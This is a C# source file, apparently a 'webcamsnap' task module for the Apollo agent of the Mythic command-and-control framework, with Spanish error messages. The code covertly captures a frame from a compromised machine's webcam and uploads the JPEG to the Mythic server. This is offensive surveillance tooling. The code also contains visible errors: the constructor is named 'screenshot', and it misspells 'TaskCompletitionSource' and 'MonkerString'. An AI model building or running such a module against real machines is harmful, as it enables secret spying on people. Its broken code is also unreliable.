#define COMMAND_NAME_UPPER

#if DEBUG
#define WEBCAMSNAP
#endif

#if WEBCAMSNAP
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using ApolloInterop.Utils;
using AForge.Video;
using AForge.Video.DirectShow;

namespace Tasks
{
    public class webcamsnap : Tasking
    {
        public screenshot(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp = CreateTaskResponse("", true);
            try
            {
                var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("No se encontraron dispositivos de cámara", true, "error"));
                    return;
                }

                var tcs = new TaskCompletitionSource<byte[]>();
                var videoSource = new VideoCaptureDevice(videoDevices[0].MonkerString);

                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    using Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
                    using MemoryStream ms = new();
                    bitmap.Save(ms, ImageFormat.Jpeg);
                    tcs.TrySetResult(ms.ToArray());
                    videoSource.SignalToStop();
                };

                videoSource.Start();

                byte[] imageBytes = tcs.Task.GetAwaiter().GetResult();

                bool result = _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, imageBytes, null, out string mythicFileId, true);
                if (!result)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("Error al guardar el archivo en Mythic", true, "error"));
                    return;
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(mythicFileId, false));
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            
            }    
            catch (Exception ex)
            {
               _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(ex.Message, true, "error"));
            }
        }
    }
}
#endif